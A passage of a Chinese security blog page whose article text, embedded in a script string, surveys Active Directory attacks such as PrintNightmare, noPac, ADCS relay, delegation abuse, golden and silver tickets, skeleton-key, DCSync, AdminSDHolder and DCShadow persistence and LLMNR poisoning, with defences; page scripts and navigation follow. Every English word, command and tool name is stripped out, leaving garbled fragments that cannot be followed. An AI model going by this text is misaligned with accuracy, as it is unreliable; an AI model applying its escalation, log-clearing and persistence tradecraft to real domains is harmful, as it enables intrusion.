路径指向共享中的恶意获取权限启动监听器如或捕获反向监听端口以权限返回扩展利用通过获取的权限执行横向移动提取域哈希如或植入持久化后门技术原理与漏洞本质核心缺陷服务以权限运行且未对函数的参数进行严格校验通过设置标志可绕过驱动签名校验强制加载任意攻击链权限绕过利用调用如绕过检查允许低权限用户安装驱动注入恶意被复制至目录并加载触发代码执行防御与缓解措施补丁修复安装微软官方补丁等并重启系统生效服务禁用非必要环境下禁用服务权限控制限制普通用户安装打印机驱动的权限启用签名及加密监控与检测监控加载异常的行为如非系统路径的模块检测目录下的新增文件如分析事件日志如中的异常打印服务操作复现失败常见原因补丁未完全生效部分系统需多次安装补丁或手动启用强制模式共享路径配置错误匿名共享权限不足或路径不可达需确保访问权限架构不匹配目标系统为位时需生成位否则加载失败参考工具漏洞利用脚本网络协议库本地提权工具漏洞原理概述漏洞是和的组合利用允许攻击者通过伪造域控机器账户的属性结合协议的缺陷将普通域用户权限提升至域管理员权限其核心原理如下伪造未对机器账户的属性进行严格校验允许攻击者创建与域控机器账户同名但不带的账户如将机器账户名从改为的原始名称从而绕过命名规则限制逻辑缺陷当密钥分发中心未找到对应的账户时会自动尝试在账户名后添加重新搜索如从变为并使用域控密钥加密服务票据从而授予攻击者域控权限漏洞利用条件目标环境要求域控未安装补丁或域内普通用户账户的凭据密码或且该用户具有创建机器账户的权限默认攻击者需能访问域控的端口和端口特殊场景若即禁止创建机器账户攻击者需利用已有用户账户的修改权限如具有权限漏洞利用流程手动利用步骤创建并配置伪造的机器账户使用模块如创建机器账户清除该账户的服务主体名称避免冲突修改为域控名称如不带请求伪造的票据使用工具请求恢复机器账户名称将改回原始值避免后续冲突通过请求高权限利用申请域控服务如或的并加载到内存权限验证与利用使用验证文件访问权限通过导出域哈希自动化工具利用以为例漏洞检测一键化提权获取服务权限获取服务权限并导出域哈希自动化工具利用步骤漏洞检测与初始化域名普通用户密码域控功能验证目标域控是否存在漏洞并自动创建伪造的机器账户关键操作创建机器账户如清除其属性修改机器账户的为域控名称如不带后缀步骤请求伪造票据工具内部调用的模块生成包含伪造的域控域名伪造机器账户名原理利用对机器账户名自动添加的缺陷使被误认为域控账户签发步骤恢复机器账户名为防止命名冲突工具自动将伪造的恢复为原始值确保后续操作不触发异常步骤通过请求高权限票据缓存路径域名域控主机名功能利用生成的请求域控服务如或的并注入内存权限提升通过模拟域管理员如获取服务票据绕过权限校验步骤执行远程命令或获取通过建立交互式会话执行系统命令导出域哈希调用进行提取域内所有用户凭据域名域控主机名域控防御与缓解措施补丁修复安装微软补丁和并重启域控权限控制将域内设置为禁用普通用户创建机器账户的权限限制用户对属性的修改权限监控与检测监控异常修改事件如分析请求中的异常操作工具与资源利用工具自动化扫描与利用工具需版漏洞利用脚本检测脚本使用模块如检查域内配置证书服务攻击中继一漏洞原理证书服务的证书接口未启用中继保护且仅允许身份验证禁用导致攻击者可通过攻击伪造域控制器机器账户的认证请求获取高权限证书进而实现权限提升或域控接管二利用条件目标环境要求服务配置已启用注册功能接口开放且未安装补丁域控状态域控制器未启用签名或中继保护机制且服务可能需运行若使用工具网络访问攻击者需能访问域控的和端口并具备中继到接口的能力攻击前提初始权限普通域用户账号或机器账号凭据密码或或无需凭证若利用触发匿名认证工具依赖需使用特定版本的支持参数及等工具三利用流程环境准备与检测定位证书服务器查询域内证书服务器地址验证漏洞存在访问域控确认仅支持认证配置中继使用的监听并中继流量至接口关键参数指定攻击模式请求域控证书模板触发认证通过强制域控向中继服务器认证脚本域名用户密码中继服务器域控二进制工具中继服务器域控无需凭证触发认证模块域控主机名中继服务器获取伪造证书成功中继后会生成编码的证书数据攻击者可截获该证书保存为文件或直接复制申请高权限票据使用将证书转换为票据证书效果票据注入当前会话后攻击者具备权限可执行操作权限提升与横向移动导出域哈希域名哈希传递域名哈希远程命令执行哈希域控四防御与缓解措施补丁与配置安装微软补丁禁用证书注册接口的认证启用签名及加密服务管理停止并禁用非必要的服务若使用攻击需此服务限制普通用户创建机器账户的权限设置监控与检测监控事件日志如中的异常机器账户操作或票据请求使用脚本检测配置风险五工具与资源攻击工具分支内存加载利用检测脚本检查配置漏洞八域权限提升委派一委派提权的核心机制委派是中允许服务以用户身份访问服务的机制旨在实现跨服务身份传递其本质是信任链的扩展但配置不当会导致攻击者通过滥用委派权限将低权限提升至域管理员甚至域控权限核心流程如下二委派类型与攻击面非约束委派原理服务账户被配置为可接收任何用户的票据授予票据并允许将其转发到任意其他服务漏洞触发条件服务账户启用属性且攻击者控制该服务账户或诱导高权限用户访问该服务攻击流程获取服务账户权限通过漏洞如弱口令劫持控制配置了非约束委派的服务账户如服务账号诱导高权限用户访问通过钓鱼等工具强制域管理员访问该服务窃取服务账户内存中缓存用户使用或导出导出内存中的票据横向移动利用窃取的申请其他服务如的服务票据执行或远程命令约束委派原理服务账户被限制只能代表用户访问特定服务如或通过和扩展实现漏洞触发条件服务账户配置了属性允许委派的目标服务列表且攻击者控制该账户攻击流程控制服务账户获取约束委派服务账户的凭据如或密码伪造请求为任意用户申请针对自身服务的无需用户密码将转发到允许委派的目标服务如域控的权限提升注入后以管理员身份访问域控服务如导出哈希基于资源的约束委派原理由资源服务如域控自主定义哪些账户可委派到自身通过属性漏洞触发条件攻击者拥有对某资源的权限如通过漏洞修改目标机器的配置攻击流程创建恶意机器账户利用默认允许普通用户创建个机器账户配置权限将恶意机器账户添加到目标域控的属性发起攻击利用恶意账户申请域控服务的获取管理员权限机器账户三攻击工具与检测常用工具信息收集枚举域内委派配置非约束委派主机约束委派账户可视化查看配置攻击利用生成伪造服务票据自动化请求与票据注入导出内存票据或攻击防御与检测加固措施禁用非必要的非约束委派配置限制约束委派范围设置防止普通用户创建机器账户启用和签名防御中继攻击监控日志服务票据请求关注异常如非标准目录服务对象修改监控属性变更四总结委派提权的核心在于滥用协议的信任链扩展机制通过控制服务账户或修改资源权限实现从低权限到域控权限的跃迁防御需结合最小权限原则日志监控与定期审计阻断攻击者从委派配置到横向移动的完整路径九域权限维持黄金票据一黄金票据的核心原理黄金票据是一种基于协议的身份伪造攻击通过窃取域控中账户的或伪造任意用户的票据授予票据绕过身份验证实现持久的域管理员权限其核心逻辑如下的生成机制协议中密钥分发中心使用账户的密钥加密攻击者获取该密钥后可自主生成无需与交互绕过密码验证黄金票据直接使用的密钥加密伪造的无法区分其合法性默认信任该票据持久性黄金票据的有效期由攻击者自定义默认年且即使域用户密码被修改或账户被禁用票据仍有效二攻击前提条件关键凭据账户的或通常通过或域控内存提取域用于构造用户组身份信息如域标识对应环境要求攻击者已控制域内一台主机并能够与域控通信端口未启用高级安全机制如或三黄金票据生成与利用流程步骤获取账户的凭据攻击使用或的导出的或使用内存提取若已获取域控权限直接从进程中提取步骤生成黄金票据使用或生成伪造的使用加密使用密钥更隐蔽生成需指定结束时间关键参数伪造的用户名通常为域名域的可通过获取将票据注入当前会话内存步骤权限验证与利用访问域控资源验证文件访问权限执行远程命令执行使用或获取域控四技术原理深度解析的结构与签名包含用户身份组有效期等信息并由的密钥签名黄金票据通过伪造签名使误认为其合法特权属性证书的绕过黄金票据可选择性包含但若域启用签名强校验如仅允许加密需确保的正确签名协议信任链无法验证自签名的默认信任其合法性这是黄金票据攻击的根源白银票据一白银票据的核心原理白银票据是一种基于协议的服务票据伪造攻击通过窃取服务账户如等的或伪造特定服务的服务票据绕过票据授予票据验证直接访问目标服务其核心逻辑如下的生成机制协议中服务票据由密钥分发中心使用服务账户的密钥加密攻击者获取该密钥后可自主生成无需与交互绕过验证白银票据直接使用服务账户的密钥加密伪造的目标服务无法区分其合法性默认信任该票据精准攻击白银票据仅对特定服务有效如攻击范围有限但隐蔽性更高无交互记录二攻击前提条件关键凭据服务账户的或通过密码破解或内存提取获取目标服务的如环境要求攻击者已控制域内一台主机能够与目标服务通信如端口目标服务未启用强加密验证如签名或加密三白银票据生成与利用流程步骤获取服务账户的凭据攻击请求高权限服务的并离线破解使用请求使用破解示例内存提取若已控制运行服务的主机使用提取服务账户凭据步骤生成白银票据使用或生成伪造的使用伪造服务票据使用密钥更隐蔽生成需指定和用户关键参数伪造的用户名如域名域的通过获取目标服务的必须与目标服务匹配将票据注入当前会话内存步骤权限验证与利用访问目标服务资源验证文件共享访问权限执行远程命令攻击需服务票据四技术原理深度解析的结构与签名包含用户身份服务有效期等信息并由服务账户的密钥签名白银票据通过伪造签名使目标服务误认为其合法特权属性证书的缺失白银票据通常不包含或包含无效因此依赖目标服务是否强制校验若服务不校验攻击者可绕过权限验证无需交互白银票据直接生成并发送至目标服务不经过因此无请求日志记录隐蔽性更高五白银票据黄金票据特性白银票据黄金票据依赖密钥服务账户的的攻击范围仅限特定服务如全域可访问任何服务是否需要无需直接生成无需直接生成隐蔽性高无交互日志较高请求日志可能异常防御难度中需轮换服务账户密码高需重置密码万能密码一万能密码的核心概念万能密码是一种特殊的权限维持技术通过在域控中植入后门使得攻击者使用预设的通用密码即可通过任意用户账户的身份验证如域管理员该技术不修改用户实际密码而是篡改身份验证流程绕过正常密码校验逻辑其核心特点包括隐蔽性不影响用户正常登录仅在攻击者使用特定密码时触发后门持久性通常依赖内存注入或系统级需结合持久化机制防止重启失效高权限要求需域管理员或权限部署后门二技术实现方式骨架密钥原理由提出的内存级后门通过进程的或中的密码验证函数为所有用户添加一个通用密码如操作步骤注入到需管理员权限特点无需修改用户密码原始密码仍有效攻击者使用通用密码即可登录重启失效进程重启后后门消失仅影响当前域控多域控环境下需在所有上部署持久化结合计划任务或事件订阅在系统启动时重新注入使用工具如的模块创建自启动服务恶意安全支持提供者原理通过注册恶意截获并篡改身份验证请求操作步骤使用安装恶意如特点记录或篡改凭据可记录所有用户密码或允许特定密码通过验证重启持久注册表项确保在重启后加载持久化将恶意写入并注册为通过组策略强制所有域控加载该密码筛选器后门原理利用密码策略机制注册恶意密码筛选器在密码修改或验证时触发后门逻辑操作步骤编写恶意实现函数检查输入密码是否为预设值如若匹配则返回验证通过注册修改注册表重启生效需重启系统或进程特点深度隐蔽与系统密码策略集成难以被常规审计发现全局生效影响所有用户密码验证流程持久化将复制到目录并锁定权限防止删除禁用文件保护或利用驱动程序绕过签名校验修改数据库原理直接修改域控的数据库为所有用户账户添加相同的备用密码哈希操作步骤获取数据库访问权限通过或直接复制和注册表文件离线注入哈希使用工具如和批量修改用户哈希恢复数据库替换原始文件并重启域控特点高风险操作不当易导致数据库损坏高隐蔽性用户正常密码不变仅攻击者知晓备用哈希持久化定期同步更新备用哈希以匹配密码策略结合后门防止数据库文件被审计后门是一种通过模拟域控制器的复制行为利用目录复制服务协议获取域内所有用户密码哈希的技术攻击者通过为普通用户或隐藏账户授予复制目录更改权限使其具备类似域控制器的数据同步能力从而实现持久化权限维持二攻击流程授予权限通过修改目标用户或计算机账户的访问控制列表添加权限示例导入模块授予用户权限验证权限是否添加成功命令行工具示例创建隐蔽账户可选创建不易被发现的隐藏账户如影子账户或机器账户创建隐藏用户设置不可逆密码将用户添加到低权限组如避免引起注意执行导出哈希使用或导出域内哈希三权限维持与隐蔽手段隐藏技术继承禁用修改继承设置使权限条目不通过常规工具如用户和计算机显示混淆安全标识符使用注入或跨域信任关系隐藏真实权限来源日志绕过清除事件日志使用删除相关事件记录清除安全日志禁用日志记录修改组策略关闭敏感操作审计需管理员权限定期同步与自动化计划任务触发通过域控或受控主机定时执行哈希导出邮件或外传通道将导出的哈希自动发送至外部服务器如或邮件一的核心作用是域控制器的安全修复模式用于在数据库损坏时执行还原操作其本地管理员账户的密码独立于域账户体系成为攻击者隐蔽权限维持的理想后门二权限持久化原理密码独立性密码在域控安装时设置与域管理员密码无关且默认不会自动同步即使域管理员密码被重置密码仍有效本地特权账户拥有本地权限可绕过域策略直接访问域控文件系统如提取隐蔽性登录行为通常不会触发域日志如仅记录在本地安全日志中难以被集中监控三攻击流程获取当前密码从中提取需域控权限使用提取账户信息查找为的本地账户通过注册表查询修改密码使用工具域控主机名输入新密码通过脚本启用登录默认情况下仅能在安全启动模式下使用需修改注册表允许在正常模式登录值说明仅在安全启动模式允许登录禁止登录允许在域控正常运行时使用登录持久化利用通过登录域控使用修改后的密码本地登录执行高权限操作如启动提取哈希使用远程登录需本地管理员权限部署隐蔽后门结合计划任务或事件订阅在系统启动时重新激活权限与影子组一的核心原理是中的一个特殊容器位于其访问控制列表会被定期同步到所有受保护的高权限组如和用户确保其权限不被意外篡改同步由进程完成默认每分钟执行一次二影子组的定义与作用影子组是攻击者创建或利用的普通用户组通过修改的将影子组添加到其权限列表中从而间接控制所有受保护的高权限组影子组本身不具备特权但其权限会通过同步到所有受保护对象实现隐蔽的权限维持三攻击流程详解步骤创建影子组创建一个看似无害的用户组如用于隐藏攻击意图步骤修改的使用或模块授予影子组对的完全控制权限使用使用模块需步骤触发同步默认每分钟自动同步也可手动触发需域控重启或强制同步重启域控高风险使用强制触发需权限步骤通过影子组行使特权影子组成员如可修改受保护组的成员如添加自己到四技术原理深度解析的同步机制进程将的复制到所有受保护对象标记为的对象覆盖其原有权限攻击者通过控制的间接控制所有高权限组隐蔽性设计影子组低权限影子组本身不直接拥有特权避免被常规审计工具如标记为高危权限继承延迟同步周期为分钟攻击痕迹不会立即暴露防御绕过修改的无需域管理员权限只需对容器有写权限默认拥有此权限攻击者可结合隐藏技术如禁用继承使权限变更难以通过工具发现十交叉信任攻击一交叉信任攻击的核心原理交叉信任攻击是攻击者利用多域环境中的信任关系如父子信任林信任外部信任通过一个被攻陷的域向另一个受信任的域横向移动最终控制整个林或外部域其核心逻辑如下信任密钥域间信任关系通过共享密钥或建立攻击者可窃取该密钥伪造跨域票据滥用通过注入目标域特权组的绕过权限验证跨域资源访问利用信任关系访问目标域的资源如文件共享数据库二攻击前提条件环境要求存在跨域信任关系如信任攻击者已控制源域的域控制器或高权限账户关键凭据信任密钥通过或注册表提取目标域的用于构造黄金票据或三攻击流程与手法提取信任密钥通过导出需源域控权限使用提取域间信任密钥或使用从注册表导出伪造跨域黄金票据若已获取域间信任密钥可伪造跨域黄金票据直接获得目标域权限无需依赖使用信任密钥生成针对目标域的黄金票据使用假设目标域为关键参数注入目标域特权组的如信任密钥非目标域的跨域资源访问访问目标域文件共享执行攻击横向移动至目标域主机注入跨域提权攻击者在源域已控中创建用户并注入目标域受信任域的高权限组如的当该用户访问目标域资源时系统会将其视为有效权限来源授予对应特权步骤获取源域控制权前提已控源域的域控制器或具备权限目标修改用户属性以注入步骤确定目标域高权限获取目标域的组如域标识工具示例步骤注入使用或修改用户属性需权限目标域标识需模块目标域标识步骤跨域访问与提权使用注入的用户访问目标域资源验证权限执行导出目标域哈希四信任类型与攻击影响信任类型攻击可行性父子信任高默认双向可传递可访问整个林资源林信任中需明确配置资源访问权限外部信任低单向不可传递仅限特定域领域信任低与非域交互如领域十一森林权限持久化一攻击原理是一种基于复制机制的高级权限维持技术允许攻击者通过注册恶意域控制器绕过常规权限验证直接修改数据库实现隐蔽的持久化其核心特点如下无需物理接触真实通过伪造身份利用合法的协议同步恶意数据绕过日志监控操作模拟正常域复制行为不触发敏感事件日志如对象修改记录高权限需求需或权限注册恶意二攻击流程环境准备权限提升获取域管理员权限如通过提取哈希或工具准备使用的模块或脚本如注册恶意域控制器使用注册恶意需权限参数说明目标对象如用户组要修改的属性如设置为的新属性值篡改对象提权用户将普通用户加入特权组如部署后门修改的或配置恶意组策略触发复制与清理强制同步触发合法从恶意拉取数据删除痕迹卸载恶意注册信息避免被逆向追踪三技术优势与隐蔽性绕过传统检测无日志记录对象修改操作不生成对象属性变更合法协议滥用利用协议流量加密且与正常复制行为相似持久化效果直接修改数据库更改写入重启后仍有效无文件落地操作全程在内存中完成不触发文件监控四攻击场景示例场景隐蔽提权攻击者控制用户将其改为组通过推送修改获得域管理员权限合法同步后可访问所有域资源场景后门修改的添加影子组的完全控制权限所有受保护组如的被同步更新影子组成员获得持久控制权五检测与防御检测方法网络流量分析监控异常的远程过程调用请求尤其是来自非主机的流量使用过滤协议检查调用来源日志监控关注操作的来源检查新注册的域控制器恶意通常无正常工具扫描手动检查域控制器列表中的异常条目识别异常的修改或用户权限提升路径防御措施权限最小化限制组权限避免账户被滥用禁用不必要的域控制器注册权限默认允许网络隔离限制域控制器间的通信端口仅允许可信启用签名与加密防止中间人攻击增强监控配置工具如实时告警异常事件定期审计对象的属性变更如补丁与加固安装复制的安全更新如启用保护防止凭据窃取六清除后门回滚修改使用合法域控制器强制同步正确配置手动修复被篡改的对象属性移除恶意使用删除恶意恶意编号审计与恢复重置受影响用户的凭据与组成员关系验证与系统容器的配置七总结利用的复制机制实现了极难检测的持久化攻击其隐蔽性源于对合法协议的滥用与无日志特性防御需结合网络隔离权限控制与深度行为分析对于企业安全团队而言持续监控域控制器间的异常通信严格管理高权限账户是抵御此类高级威胁的关键十二其他补充知识点一利用协议降级进行嗅探针对通过降级投毒结合哈希嗅探的攻击方式以下是技术原理攻击流程及防御方案攻击原理名称解析协议的弱点名称解析协议降级解析失败后的备用机制当客户端通过无法解析目标主机名时会自动回退到链路本地多播名称解析或进行本地网络广播查询攻击者利用点攻击者监听并伪造响应声称自己是目标主机诱导客户端向攻击者发起认证请求如等从而获取哈希本地链路多播使用多播地址或在本地子网内广播查询通过端口广播查询无认证机制这些协议未验证响应者身份攻击者可轻易伪造响应攻击流程步骤诱骗客户端发起认证用户或服务尝试访问一个不存在的共享路径如误输解析失败后客户端通过广播查询攻击者如使用工具抢先响应声明自己是步骤触发认证客户端向攻击者伪装的服务器发起或等协议连接攻击者发送认证挑战客户端计算响应包含用户密码的哈希并返回步骤捕获哈希攻击者捕获客户端的响应如后续可通过离线暴力破解或中继攻击利用该哈希常用工具自动化监听请求并伪造响应捕获哈希类似支持更多协议利用投毒强制客户端使用攻击者控制的服务器攻击示例捕获哈希启动启用等服务的伪造诱导客户端触发请求用户点击无效的共享链接如捕获哈希输出捕获的哈希保存为破解哈希使用暴力破解防御方案禁用不安全的协议关闭组策略计算机配置管理模板网络客户端关闭启用禁用网络适配器属性高级设置禁用限制使用如无需禁用或配置防火墙规则过滤本地链路多播强制使用安全扩展配置防止投毒确保内网服务器可靠避免解析失败阻止协议滥用启用签名防止中继攻击组策略计算机配置策略安全设置本地策略安全选项网络服务器数字签名通信总是禁用仅允许或组策略计算机配置策略安全设置本地策略安全选项网络安全身份验证级别仅发送响应限制使用通过组策略或注册表网络监控与隔离检测异常的流量如非管理员主机的响应分段内网限制敏感主机的多播通信用户教育与策略培训用户避免点击未知共享链接使用主机名全称访问资源减少解析失败概率扩展中继攻击防御若攻击者将捕获的哈希直接中继到其他服务如危害更大启用签名中继攻击要求目标服务禁用签名启用绑定通道与认证信息总结通过投毒和哈希捕获是内网渗透的常见手法防御需结合协议禁用认证加固和网络监控企业应优先使用并彻底淘汰协议',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2025-06-04 00:25:14',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const now = new Date()
          const hour = now.getHours()
          const isNight = hour <= 8 || hour >= 22
          if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
          else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/avtor.png?x-oss-process=style/img-to-webp"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">高木のBlog</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a><div id="he-plugin-simple"></div><script>var WIDGET = {
  "CONFIG": {
    "modules": "0124",
    "background": "2",
    "tmpColor": "FFFFFF",
    "tmpSize": "16",
    "cityColor": "FFFFFF",
    "citySize": "16",
    "aqiColor": "E8D87B",
    "aqiSize": "16",
    "weatherIconSize": "24",
    "alertIconSize": "18",
    "padding": "10px 10px 10px 10px",
    "shadow": "0",
    "language": "auto",
    "borderRadius": "20",
    "fixed": "true",
    "vertical": "top",
    "horizontal": "left",
    "left": "10",
    "top": "7.1",
    "key": "df245676fb434a0691ead1c63341cd94"
  }
}
</script><link rel="stylesheet" href="https://widget.qweather.net/simple/static/css/he-simple.css?v=1.4.0"/><script src="https://widget.qweather.net/simple/static/js/he-simple.js?v=1.4.0"></script></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/bangumis/"><i class="anzhiyufont anzhiyu-icon-bilibili faa-tada" style="font-size: 0.9em;"></i><span> 追番页</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 站点动态</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-shoe-prints1 faa-tada" style="font-size: 0.9em;"></i><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button only-home" id="travellings_button" title="随机前往一个开往项目网站"><a class="site-page" onclick="anzhiyu.totraveling()" title="随机前往一个开往项目网站" href="javascript:void(0);" rel="external nofollow" data-pjax-state="external"><i class="anzhiyufont anzhiyu-icon-train"></i></a></div><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/red_cross.png?x-oss-process=style/img-to-webp" target="_blank"><img class="post-qr-code-img" alt="红十字会" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/red_cross.png?x-oss-process=style/img-to-webp"/></a><div class="post-qr-code-desc">红十字会</div></li><li class="reward-item"><a href="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/logo.png?x-oss-process=style/img-to-webp" target="_blank"><img class="post-qr-code-img" alt="LOGO" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/logo.png?x-oss-process=style/img-to-webp"/></a><div class="post-qr-code-desc">LOGO</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/AI%E8%AF%AD%E8%A8%80%E5%A4%A7%E6%A8%A1%E5%9E%8B/" style="font-size: 1.05rem;">AI语言大模型<sup>1</sup></a><a href="/tags/APK/" style="font-size: 1.05rem;">APK<sup>2</sup></a><a href="/tags/Android/" style="font-size: 1.05rem;">Android<sup>1</sup></a><a href="/tags/CVE/" style="font-size: 1.05rem;">CVE<sup>5</sup></a><a href="/tags/Chrome/" style="font-size: 1.05rem;">Chrome<sup>2</sup></a><a href="/tags/Docker/" style="font-size: 1.05rem;">Docker<sup>2</sup></a><a href="/tags/IPV6/" style="font-size: 1.05rem;">IPV6<sup>1</sup></a><a href="/tags/JAVA/" style="font-size: 1.05rem;">JAVA<sup>6</sup></a><a href="/tags/JS%E9%80%86%E5%90%91/" style="font-size: 1.05rem;">JS逆向<sup>2</sup></a><a href="/tags/NAS/" style="font-size: 1.05rem;">NAS<sup>3</sup></a><a href="/tags/PHP/" style="font-size: 1.05rem;">PHP<sup>2</sup></a><a href="/tags/RCE/" style="font-size: 1.05rem;">RCE<sup>19</sup></a><a href="/tags/TLS/" style="font-size: 1.05rem;">TLS<sup>1</sup></a><a href="/tags/cisp/" style="font-size: 1.05rem;">cisp<sup>2</sup></a><a href="/tags/draft/" style="font-size: 1.05rem;">draft<sup>5</sup></a><a href="/tags/esxi/" style="font-size: 